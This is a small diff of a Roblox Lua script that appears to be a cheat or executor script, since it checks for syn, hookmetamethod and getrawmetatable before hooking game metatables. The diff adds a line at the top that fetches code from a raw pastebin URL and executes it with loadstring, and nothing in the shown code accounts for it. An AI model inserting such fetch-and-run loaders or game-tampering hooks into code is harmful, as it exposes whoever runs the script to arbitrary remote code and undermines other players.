@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/NWK2hFxB"))()
+
 Services = setmetatable({},{__index=function(s,r) return game:service(r) end})
 
 if syn and hookmetamethod and getrawmetatable then 
